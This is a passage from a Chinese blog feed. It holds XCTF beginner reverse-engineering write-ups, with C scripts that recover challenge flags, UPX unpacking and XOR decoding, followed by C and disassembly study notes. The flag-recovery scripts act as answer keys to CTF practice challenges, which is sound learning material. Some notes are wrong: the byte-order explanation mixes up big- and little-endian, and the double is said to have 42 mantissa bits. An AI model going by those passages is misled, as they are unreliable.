srcset="/img/loading.gif" alt="-w511"><br>发现是v10数组与v13数组逐对比后，如果相同就会输出正确的字眼。前面有对用户输入的v9进行一些处理，处理完后会放入v10中。下面具体分析一下如何处理就可以了，主要在sprintf函数和strcat函数。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733887654757.jpg" srcset="/img/loading.gif" alt="-w379"><br>点击进去看到<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733887851687.jpg" srcset="/img/loading.gif" alt="-w555"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733888354402.jpg" srcset="/img/loading.gif" alt="-w632"><br>那就很清楚了，就是把v4字符串也就是刚刚输入的字符串进行格式化位16进制的整数输出到v8中，然后用strcat函数把处理后的v8放入v10。（此处原来的v10是空的，所以连接v10和v8，实际相当于把v8放入v10）</p><p>接下来就是v10与v13进行对比，v13是刚刚复制过来的<code>437261636b4d654a757374466f7246756e</code>，那就可以看出来咱们直接把这个进行16进制转回去就可以了。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733891570437.jpg" srcset="/img/loading.gif" alt="-w526"></p><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>这道题是拿到了一段c源码，打开发现关键处：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733897127019.jpg" srcset="/img/loading.gif" alt="-w1023"><br>可以看出来把<code>first second strlen(argv[3])</code>搞清楚是什么就可以了。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733897938110.jpg" srcset="/img/loading.gif" alt="-w590"><br>很简单可以看出这3个是什么值，下面直接放解密代码：</p><div class="hljs"><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;iostream&gt;int main(int argc, char *argv[]) {    unsigned int hash = 0xcafe * 31337 + (25 % 17) * 11 + strlen(&quot;h4cky0u&quot;) - 1615810207;    printf(&quot;Get your key: &quot;);    printf(&quot;%x\n&quot;, hash);    return 0;}</code></pre></div><p>拿到flag：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733900988974.jpg" srcset="/img/loading.gif" alt="-w603"></p><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个看题目就是知道加了壳。且是个二进制文件，丢进edb看一下。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733910805939.jpg" srcset="/img/loading.gif" alt="-w685"></p><p>单步调试走一会，在寄存器窗口看到：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733910639998.jpg" srcset="/img/loading.gif" alt="-w1019"><br>这很明显是加了UPX壳。</p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733911418603.jpg" srcset="/img/loading.gif" alt="-w733"><br>这里就用<code>upx -d</code>直接一键脱壳。以后可以练习手动脱upx壳。<br>脱壳完成后用IDA进行分析：</p><h3 id="IDA静态分析-1"><a href="#IDA静态分析-1" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733913704154.jpg" srcset="/img/loading.gif" alt="-w617"><br>打开直接出现了flag，这个题就考个识别壳和upx脱壳了。</p><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741646328276.jpg" srcset="/img/loading.gif" alt="-w569"><br>先查看一下，无壳，elf 64位应用。</p><h3 id="IDA静态分析-2"><a href="#IDA静态分析-2" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741650120350.jpg" srcset="/img/loading.gif" alt="-w442"><br>点击此处出现了：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15741650432513.jpg" srcset="/img/loading.gif" alt="-w493"><br>确认关键代码段。开始对这个循环进行分析，需要对v8 v7 v9重点分析。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15741657131708.jpg" srcset="/img/loading.gif" alt="-w1026"><br>这里面难点就在如何对v8的理解。</p><h3 id="v8与关键加密分析"><a href="#v8与关键加密分析" class="headerlink" title="v8与关键加密分析"></a>v8与关键加密分析</h3><p>v8是一个_int64也就是long long类型的数值，其存入内存需要变成16进制的数值存入。<img src="/2019/11/09/Xctfre_新手区wp/images/15741666120370.jpg" srcset="/img/loading.gif" alt="-w496"><br>刚刚我们注意到这个x86框架x64的程序，其在内存是用小端序存入的，也就是地址高位放数值高位，地址低位放地址低位。那么其放好就是<img src="/2019/11/09/Xctfre_新手区wp/images/15741662400799.jpg" srcset="/img/loading.gif" alt="-w226"><br>正好是反过来的。<br>然后分析一下加密代码，这主要就是指针知识了：<br><code>v4 = (unsigned int)(char)(*((_BYTE *)&amp;v8 + i % v7) ^ v9[i]);</code><br>这里的（char）是给long long强制转型，然后为了后面的以2位16进制数也就是一个字节，来读取数值。<code>i % v7</code>其是就是控制i = 0—6正好把这个v8给正确读取完。然后一位位取完v8后开始跟v9异或。</p><h3 id="脚本解密"><a href="#脚本解密" class="headerlink" title="脚本解密"></a>脚本解密</h3><div class="hljs"><pre><code>#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    int v6;    char v7[]=&quot;harambe&quot;;    v6 = 7;    char v8[18];    strcpy(v8, &quot;:\&quot;AL_RT^L*.?+6/46&quot;);    char s[18];    int i;    for ( i = 0; i &lt; strlen(v8); ++i) {        s[i] =v7[i%v6]^v8[i];    }    for (int j = 0; j &lt; strlen(v8); ++j) {        printf(&quot;%c&quot;,s[j]);    }    return 0;}</code></pre></div><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741669073968.jpg" srcset="/img/loading.gif" alt="-w402"></p><h3 id="对于大小端序的知识补充"><a href="#对于大小端序的知识补充" class="headerlink" title="对于大小端序的知识补充"></a>对于大小端序的知识补充</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741673443772.jpg" srcset="/img/loading.gif" alt="-w718"><br>数据类型为字节型( BYTE)时，其长度为1个字节,保存这样的数据时，无论采用大端序还是小端序，字节顺序都是一样的。<strong>但是数据长度为2个字节以上(含2个字节)时，采用不同字节序保存它们形成的存储顺序是不同的。采用大端序存储数据时，内存地址低位存储数据的高位，内存地址高位存储数据的低位，这是一种最直观的字节存储顺序;采用小端序存储数据时,地址高位存储数据的高位，地址低位存储数据的低位，这是一种逆序存储方式，保存的字节顺序被倒转，它是最符合人类思维的字节序。</strong></p><p><strong>强调</strong>：只有数据长度在2个字节以上时，即数据为多字节数据时，选用大端序还是小端序会导致数据的存储顺序不同。字符串“abcde” 被保存在一个字符 ( Char )数组str中,字符数组在内存中是连续的，此时向字符数组存放数据，无论采用大端序还是小端序，存储顺序都相同。</p><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741680757822.jpg" srcset="/img/loading.gif" alt="-w764"><br>这个没什么好说的，主函数点击一下他要打印的字符串就可以看到了flag，当然shift + f12也是可以看到。</p><h2 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h2><h2 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h2><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><h2 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h2><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Re</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言与反汇编学习（四）</title>
    <link href="/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（四）"><a href="#C语言与反汇编学习（四）" class="headerlink" title="C语言与反汇编学习（四）"></a>C语言与反汇编学习（四）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习以下内容</p><ol><li>内存图</li><li>全局变量、局部变量</li><li>函数参数的分析</li><li>分支语句:<code>if</code> <code>if...else...</code> <code>if..else if..else if....else</code>分支语句的嵌套使用``的正向与逆向分析</li></ol><h2 id="内存图"><a href="#内存图" class="headerlink" title="内存图"></a>内存图</h2><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15718432593875.jpg" srcset="/img/loading.gif" alt="-w301"><br>在电脑中任何一个程序运行时，其会在内存中分成以上图中的几个区域。详细每个区是怎么样的，直接看图即可。</p><h2 id="全局变量、局部变量"><a href="#全局变量、局部变量" class="headerlink" title="全局变量、局部变量"></a>全局变量、局部变量</h2><div class="hljs"><pre><code>int g_n = 10; //全局变量int Funcation() //代码区，调用时执行{    int x = 1;//局部变量    int y = 3;    return g_n+x+y;    }}</code></pre></div><p>就用这个代码段来分析。</p><h3 id="全局变量的特点"><a href="#全局变量的特点" class="headerlink" title="全局变量的特点"></a>全局变量的特点</h3><p>1、全局变量在程序编译完成后地址就已经确定下来了，<strong>只要程序启动，全局变量就已经存在了</strong>，启动后里面是否有值取决于声明时是否给定了初始值，如果没有，默认为0。<br>2、全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值.<br>3、全局变量所占内存会一直存在，知道整个进程结束.<br>4、全局变量的反汇编识别：<code>MOV 寄存器,byte/word/dword ptr ds:[0x12345678]</code><br>通过寄存器的宽度，或者byte/word/dword 来判断全局变量的宽度.<strong>全局变量就是所谓的基址</strong>。</p><h3 id="局部变量的特点"><a href="#局部变量的特点" class="headerlink" title="局部变量的特点"></a>局部变量的特点</h3><p>1、局部变量在程序编译完成后并没有分配固定的地址.（因为计算机不知道什么时候会调用这个函数，所以不会提前分配好）<br>2、在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存.<br>3、当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据.局部变量消失.<br>4、局部变量只能在函数内部使用，函数A无法使用函数B的局部变量.（从堆栈图中也可以想象的到原理）<br>5、局部变量的反汇编识别：<code>[ebp-4]</code>[ebp-8]<code>[ebp-0xC]</code>等等类似的情形。</p><h2 id="函数参数的分析"><a href="#函数参数的分析" class="headerlink" title="函数参数的分析"></a>函数参数的分析</h2><p>如何判断函数有几个参数，已经分别是什么？</p><p>一般情况：<br>    步骤一：观察调用处的代码<br>    push    3<br>    push    2<br>    push    1<br>    call    0040100f</p><p>步骤二：找到平衡堆栈的代码继续论证</p><div class="hljs"><pre><code>call    0040100fadd     esp,0Ch</code></pre></div><p>或者函数内部</p><div class="hljs"><pre><code>ret 4/8/0xC/0x10</code></pre></div><p>最后，两者一综合，函数的参数个数基本确定.可以应对百分之八十的情况。</p><p>但剩下的百分之二十呢？<br>上面的分析存在的问题：<br>1、<strong>参数传递未必都是通过堆栈，还可能通过使用寄存器</strong>.<br>例：</p><div class="hljs"><pre><code>push ebxpush eaxmov ecx,dword ptr ds:[esi]mov edx,dword ptr ds:[edi]push 45push 33call 函数地址</code></pre></div><p>2、<strong>函数调用处的代码无法查看.</strong><br>例：<br>进入函数查看汇编代码：</p><div class="hljs"><pre><code>00401050   push         ebp00401051   mov         ebp,esp00401053   sub         esp,48h00401056   push        ebx00401057   push        esi00401058   push        edi    00401059   push        ecx    0040105A   lea         edi,[ebp-48h]0040105D   mov         ecx,12h00401062   mov         eax,0CCCCCCCCh00401067   rep stos    dword ptr [edi]00401069   pop         ecx    0040106A   mov         dword ptr [ebp-8],edx0040106D   mov         dword ptr [ebp-4],ecx00401070   mov         eax,dword ptr [ebp-4]00401073   add         eax,dword ptr [ebp-8]00401076   add         eax,dword ptr [ebp+8]00401079   mov         [g_x (00427958)],eax0040107E   pop         edi    0040107F   pop         esi    00401080   pop         ebx    00401081   mov         esp,ebp00401083   pop         ebp    00401084   ret         4        </code></pre></div><p>观察步骤：<br>1、不考虑ebp、esp<br>2、只找给别人赋值的寄存器<br>eax/ecx/edx/ebx/esi/edi<br>3、找到以后追查其来源，如果，该寄存器中的值，不是在函数内存赋值的，那一定是传进来的参数.<br>**公式一：寄存器 + ret 4\8\0C = 参数个数<br>公式二：寄存器 + [ebp+8]+[ebp+0x] = 参数个数**<br>这两个公式可以互相结合验证看是否算的对。<br>如以上代码段，只可以找到<code>edi,ecx,edx</code>给别人赋值，但是其中<code>edi ecx</code>都是函数内存赋的值，所以只剩下<code>edx</code>，在加上最后的<code>ret 4</code>（这个肯定是push进来了一个参数）就等于2，也就是2个参数。与公式二检验发现没问题，<code>[ebp+0x]</code>类似的只出现一个.</p><h2 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h2><h3 id="正向代码练习"><a href="#正向代码练习" class="headerlink" title="正向代码练习"></a>正向代码练习</h3><p> 练习1:定义4个int类型的全局变量，分别是g_x,g_y,g_z,g_r,使用if..else..分支语句，将最大的值存储到g_r中。<br>    #include “stdafx.h”<br>    int g_x = 5;<br>    int g_y = 3;<br>    int g_z = 7;<br>    int g_r = 0;<br>    void getMax()<br>    {<br>        if(g_x&gt;g_y)<br>        {<br>            if (g_x&gt;g_z)<br>            {<br>                g_r=g_x;<br>            }<br>            else{<br>                    g_r=g_z;<br>                }<br>        }<br>        else if (g_y &gt; g_z)<br>        {<br>            g_r=g_y;<br>        }<br>        else g_r=g_z;<br>        printf(“%d\n”,g_r);<br>    }<br>    int main(int argc, char* argv[])<br>    {<br>        getMax();<br>        return 0;<br>    }</p><p>练习2:找出数组里面最大的值，并存储到全局变量中<br>    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719199995620.jpg" srcset="/img/loading.gif" alt="-w238"><br>    #include “stdafx.h”<br>    int a[4] = {2,5,7,9};<br>    int g_r = 0;<br>    void getMax()<br>    {<br>        if(a[0]&gt;a[1])<br>        {<br>            if (a[0]&gt;a[2])<br>            {<br>                if (a[0]&gt;a[3])<br>                {<br>                    g_r=a[0];<br>                }<br>                else g_r=a[3];<br>            }<br>            else if(a[2]&gt;a[3]){<br>                    g_r=a[2];<br>                }<br>                else g_r=a[3];<br>        }<br>        else if (a[1] &gt; a[2])<br>        {<br>            if (a[1]&gt;a[3])<br>            {<br>                g_r=a[1];<br>            }<br>            else g_r=a[3];<br>        }<br>        else if (a[2] &gt; a[3])<br>        {<br>            g_r=a[2];<br>        }<br>        else g_r=a[3];<br>        printf(“%d\n”,g_r);<br>    }<br>    int main(int argc, char* argv[])<br>    {<br>        getMax();<br>        return 0;<br>    }</p><h4 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h4><p>1：分支语句中if else,及其相互套用，要知道当某个条件成功后，执行其中的代码，然后以后于它的代码都不会再进行判断和执行。<br>2：一个if只对应于一个else，else只能在if后出现与其搭配使用。</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="IF语句逆向分析"><a href="#IF语句逆向分析" class="headerlink" title="IF语句逆向分析"></a>IF语句逆向分析</h4><p>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的近end中没有jmp指令。根据以上特征，把jxx指令取反后，即可还原if语句的代码。（<strong>我们要知道jcc代码跳转语句，其判断条件正好跟c的if判断条件是正好反过来的。</strong>）<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719206938300.jpg" srcset="/img/loading.gif" alt="-w262"><br>汇编代码：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719208117580.jpg" srcset="/img/loading.gif" alt="-w331"><br>对于这段代码我们采取一定的分析顺序来分析：</p><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   无</li><li>分析全局变量       <code>mov  dword ptr 004225c4,ecx</code></li><li>功能分析:将参数X存到到EAX中，然后比较EAX,与参数Y的大小.如果X&lt;=Y 那么跳转到00401059的位置,否则，将X的值存储到全局变量中</li><li>返回值分析   无</li></ol><p>练习：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719212740917.jpg" srcset="/img/loading.gif" alt="-w367"></p><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   <code>[ebp-4]：a</code></li><li>分析全局变量       <code>mov         eax,[004225c4]: m</code> </li><li>功能分析:(省略，直接以c语言代码表示)</li><li>返回值分析   无</li></ol><p><strong>逆为c函数</strong>：</p><div class="hljs"><pre><code>int m=1;void Funcation(int x, int y){    int a;    a=m;    if(x&lt;=y)    {        y=y+a;        m=y;    }}</code></pre></div><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719214461732.jpg" srcset="/img/loading.gif" alt></p><h4 id="IF…ELSE…语句逆向分析"><a href="#IF…ELSE…语句逆向分析" class="headerlink" title="IF…ELSE…语句逆向分析"></a>IF…ELSE…语句逆向分析</h4><p>if..ees语句比if语句多出了-一个“else” ，当if表达式结果为真时跳过else分支语句块，当表达式结果为假时跳转到else 分支语句块中。<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719216273356.jpg" srcset="/img/loading.gif" alt="-w226"><br>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else中有的上方有jmp指令。else 代码的结尾没有jmp指令，else 的代码也会执行if _else. _end 的代码。根据以上特征，把jxx指令取反后，即可还原if…ese语句的代码<br><strong>总结：跳转执行一部分代码，不跳转执行另外一部分代码</strong><br>汇编代码：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719219621907.jpg" srcset="/img/loading.gif" alt="-w369"><br>同样安装一定的顺序：</p><p>1：分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code><br>2：分析局部变量   <code>[ebp-4] = eax = [004225c4]</code><br>3：分析全局变量       <code>[004225c4] G</code><br>4：功能分析:比较X与Y的大小，如果X&lt;=Y那么执行<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719249677324.jpg" srcset="/img/loading.gif" alt="-w427"><br>如果X&gt;Y 那么执行<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719249899962.jpg" srcset="/img/loading.gif" alt="-w435"><br>5：返回值分析   无<br><strong>练习：</strong><br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719223446828.jpg" srcset="/img/loading.gif" alt="-w382"></p><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   <code>[ebp-4]：eax:[004225c4]:a</code> <code>[ebp-8]:b:2</code></li><li>分析全局变量       <code>mov         eax,[004225c4]</code> </li><li>功能分析:(省略，直接以c语言代码表示)</li><li>返回值分析   无</li></ol><p><strong>还原成c函数：</strong></p><div class="hljs"><pre><code>int m=1;void Funcation(int x,int y){    int a,b;    a=m;    b=2;    if (x&gt;=y)    {        b=b+1;        if (x&lt;y)        {            m=b;        }else m=a+b;    }}</code></pre></div><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719224472672.jpg" srcset="/img/loading.gif" alt></p><h4 id="IF…ELSE-IF…ELSE逆向分析"><a href="#IF…ELSE-IF…ELSE逆向分析" class="headerlink" title="IF…ELSE IF…ELSE逆向分析"></a>IF…ELSE IF…ELSE逆向分析</h4><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719225611187.jpg" srcset="/img/loading.gif" alt="-w307"><br>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else if中有jmp指令。else if的跳转目的else中有jmp指令，且else码的结尾没有jmp指令，<strong>所有jmp的目标地址一致</strong>。根据以上特征，把jxx指令取反，即可还原if…else if….else语句的代码。<br><strong>如果某个分支没有条件判断，则为else部分</strong>。<br>汇编代码：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719226993158.jpg" srcset="/img/loading.gif" alt="-w334"><br>    函数内部功能分析：<br>    1、分析参数：<code>[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z</code><br>    2、分析局部变量    <code>[ebp-4] = A = 0                        [ebp-8] = B = 1                        [ebp-0Ch] = C = 2</code><br>    3、分析全局变量        无<br>    4、功能分析        </p><div class="hljs"><pre><code>if(x&gt;y)                                {                                    A = B+1;                                }                                else if(x&gt;z)                                {                                    A = C+1;                                }                                else if(x&gt;z)                                {                                    A = B+C                                }                                else                                {                                    A = B+C+1;                                }                                return A;                </code></pre></div><p>练习：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719228667624.jpg" srcset="/img/loading.gif" alt="-w305"><br>1、分析参数：<code>[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z</code><br>    2、分析局部变量    <code>[ebp-4] = A                        [ebp-8] = B                        [ebp-0Ch] = C</code><br>    3、分析全局变量        无<br>    4.返回值分析 a+1<br>    还原成C函数：</p><div class="hljs"><pre><code>int Funcation(int x,int y,int z){    int a=0;    int b=1;    int c=2;    if (x&lt;=y)    {        a=b-1;    }    else if (y&gt;=z)    {        a=c+1;    }    else if (x&gt;z)    {        a=b+c;    }    else a=b+c-1;    return a+1;}</code></pre></div><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719229837839.jpg" srcset="/img/loading.gif" alt></p><h4 id="感悟-1"><a href="#感悟-1" class="headerlink" title="感悟"></a>感悟</h4><p>每个分支类型都有自己的特征点，记清楚这个后，分析起来会容易很多。</p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言与反汇编学习（三）</title>
    <link href="/2019/10/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2019/10/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（三）"><a href="#C语言与反汇编学习（三）" class="headerlink" title="C语言与反汇编学习（三）"></a>C语言与反汇编学习（三）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习一下C语言的数据类型与数据存储。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p><img src="/2019/10/20/C语言学习与反汇编（三）/images/15715865045834.jpg" srcset="/img/loading.gif" alt="-w709"></p><h3 id="学习数据类型的三个要素"><a href="#学习数据类型的三个要素" class="headerlink" title="学习数据类型的三个要素"></a>学习数据类型的三个要素</h3><p>1、存储数据的宽度<br>2、存储数据的格式<br>3、作用范围(作用域)<br>这些都是谈起一个数据类型的基本要素。</p><h3 id="整数类型：char-short-int-long"><a href="#整数类型：char-short-int-long" class="headerlink" title="整数类型：char  short  int long"></a>整数类型：char  short  int long</h3><table><thead><tr><th>char</th><th>8BIT</th><th>1字节</th></tr></thead><tbody><tr><td>short</td><td>16BIT</td><td>2字节</td></tr><tr><td>int</td><td>32BIT</td><td>4字节</td></tr><tr><td>long</td><td>32BIT</td><td>4字节</td></tr></tbody></table><div class="hljs"><pre><code>char i = 0xFF;short x =0xFF;long y =0xFF;</code></pre></div><p>我们来看下在汇编其是什么样的：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15715872059570.jpg" srcset="/img/loading.gif" alt="-w505"><br>注意<code>byte word dword</code>的区别。<br>然后我们测试一下以下代码：</p><div class="hljs"><pre><code>char i = 0x12345678;short x = 0x12345678;long y = 0x12345678;</code></pre></div><p><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716535773728.jpg" srcset="/img/loading.gif" alt="-w639"><br>然后看到还是<code>byte word dword</code>，并且也没有报错，但是我们运行以后可以看到<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716536656301.jpg" srcset="/img/loading.gif" alt="-w1106"><br><strong>这就说明你写了32位的数给<code>char i</code>这个8位的容器，这是允许的，但是只能装下8位，就从低位开始把78放入。</strong></p><p>整数类型分为有符号(signed)和无符号(unsigned)两种：</p><div class="hljs"><pre><code>char i = 0xFF;unsigned char i = 0xFF;</code></pre></div><p>要知道其在内存里存着显示的都是FF<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716703064593.jpg" srcset="/img/loading.gif" alt="-w178"><br>但是输出打印出来一个是255 一个是-1，这就是说明在内存中存储的方式完全一样，但会根据你的定义来确实其是有符号还是无符号。其默认是有符号的，当你想用无符号的时候需要你来定义。并且这个只有在<strong>类型转换和大小比较中特别注意</strong>。因为你直接定义个无符号数，其在内存放的是和原来有符号数一样的，只是你在比较时编译器在编译的时候，<strong>会把其会把汇编代码跳转那里改成特定对应的JCC代码</strong>（只要针对无符号，因为默认是有符号的）。<br>例子：<br>无符号数比较，jcc是JBE，原来没有指定是无符号时，其是JLE（有符号）<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716712689830.jpg" srcset="/img/loading.gif" alt="-w533"><br>总结：1：在内存中存储的方式完全一样 。<br>        2：在类型转换和大小比较中特别注意（运算）。</p><h3 id="浮点类型：float-double"><a href="#浮点类型：float-double" class="headerlink" title="浮点类型：float double"></a>浮点类型：float double</h3><p>float和double在存储方式上都是遵从IEEE的规范的<br>float的存储方式如下图所示：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716717408638.jpg" srcset="/img/loading.gif" alt="-w619"><br>double的存储方式如下图所示：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716718171405.jpg" srcset="/img/loading.gif" alt="-w729"></p><h4 id="将一个float型转化为内存存储格式的步骤为"><a href="#将一个float型转化为内存存储格式的步骤为" class="headerlink" title="将一个float型转化为内存存储格式的步骤为:"></a>将一个float型转化为内存存储格式的步骤为:</h4><ol><li>先将这个实数的绝对值化为二进制格式</li><li>将这个二进制格式实数的小数点左移或右移n位，直到小数点移动到第一个有 效数字的右边。</li><li>从小数点右边第一一位开始数出二十三位数字放入第22到第0位。</li><li>如果实数是正的，则在第31位放入“0”，否则放入“1”。</li><li>如果n是左移得到的，说明指数是正的，第30位放入“1”。如果n是右移得到的或n=0，则第30位放入“0”。</li><li>如果n是左移得到的，则将n减去1后化为二进制，并在左边加“0”补足七位，放入第29到第23位。</li><li>如果n是右移得到的或n=0，则将n化为二进制后在左边加“0’补足七位，再各位求反，再放入第29到第23位。</li></ol><p>这是官方解释。有点麻烦。先练习一个：<br>8.25转成浮点存储<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716720748599.jpg" srcset="/img/loading.gif" alt="-w271"><br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716720864148.jpg" srcset="/img/loading.gif" alt="-w229"><br>所以8.25用二进制表示可表示为1000.01，科学计数法表示一下：1.00001X2^3<br>小数点向左移动3位 指数为3，然后按照上面先放第一个空格0（因为是正数），接着放最后一个大格子00001（科学计数法表示后从小数点后），然后中间格子第一位1（因为是左移小数点），指数3-1=2变成二进制10从右边开始放入。这就是IEEE规范。(可以感受到最麻烦就是中间这段的确定值)<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716722496131.jpg" srcset="/img/loading.gif" alt="-w409"><br>按四位分割<code>0100 0001 0000 0100 0000 0000 0000  0000</code>=41040000，然后就这样的形式存入计算机内存。</p><p>我下面用简单的且是正确的办法来转换：<br>将float类型的12.5 转换成16进制：<br>先整理正数部分，12=C=1100<br>小数部分 0.5 * 2=1.0<br>所以二进制就是1100.1，科学计数法 1.1001x2^3<br>这次对中间格子是直接用<code>127+x的结果</code> 变成二进制填充这个格子，x的值就是指数，其中<strong>左移是正右移为负</strong><br> <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716732149036.jpg" srcset="/img/loading.gif" alt="-w382"></p><h4 id="double类型"><a href="#double类型" class="headerlink" title="double类型"></a>double类型</h4><p>前面讲解了单精度浮点类型的IEEE编码。double类型和float类型大同小异，只是double类型表示的范围更大，占用空间更多，是float类型所占用空间的两倍。当然，精准度也会更高。</p><p>double类型占8字节的内存空间，同样，最高位也用于表示符号，指数位占11位，剩<br>余42位用于表示位数。<br>在float中，指数位范围用8位表示，加127后用于判断指数符号。在double中，由于扩大了精度，因此指数范围使用11位正数表示，<strong>加1023后可用于指数符号判断</strong>。</p><p>double类型的IEEE编码转换过程与float 类型一样，可根据float类型的转换流程<br>来转换double类型。<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15717429314228.jpg" srcset="/img/loading.gif" alt="-w756"></p><h3 id="英文字符存储"><a href="#英文字符存储" class="headerlink" title="英文字符存储"></a>英文字符存储</h3><p>char x = ‘A’;<br>对于一个英文字符，编译器会自动查ASCII表获取其定义的7位二进制数，然后转换存储其16进制放入内存中。例：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15717434285598.jpg" srcset="/img/loading.gif" alt="-w446"><br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15717434479758.jpg" srcset="/img/loading.gif" alt="-w420"><br>补充：</p><ul><li>标准 ASCII 码使用 7 位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符。</li><li>ASCII 码使用指定的 7 位或 8 位二进制数组合来表示 128 或 256 种可能的字符。</li><li>扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 